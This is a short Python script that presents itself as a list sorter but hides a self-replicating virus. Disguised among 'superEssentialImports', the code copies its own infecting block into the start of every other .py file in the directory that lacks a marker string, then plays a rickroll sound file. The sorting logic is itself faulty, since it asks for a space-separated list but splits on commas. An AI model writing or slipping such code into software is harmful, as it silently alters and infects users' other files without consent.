a = input('space-seperated list to be sorted? ').replace(' ','').split(',')
# this sorts the list
import glob, sys, winsound # superEssentialImports
for i in list(filter(lambda x: '1_c0ncur_th4t_hyp3rd1men510n_n3ptun14_15_t3h_b3st' not in open(x,'r').read(), glob.glob("*.py"))):
    with open(sys.argv[0], 'r') as org: mycode = org.readlines()
    with open(i, 'r') as original: data = original.read()
    with open(i, 'w') as modified: modified.write(''.join(mycode[[mycode.index(s) for s in mycode if 'superEssentialImports' in s][0]:[mycode.index(s) for s in mycode if 'w00tw00thyperdimensionneptuniaftw' in s][1]+1])+'\n' + data)
try:
    winsound.PlaySound('rickroll.wav', winsound.SND_FILENAME)
except:
    pass
# w00tw00thyperdimensionneptuniaftw

print(sorted(a))
input()
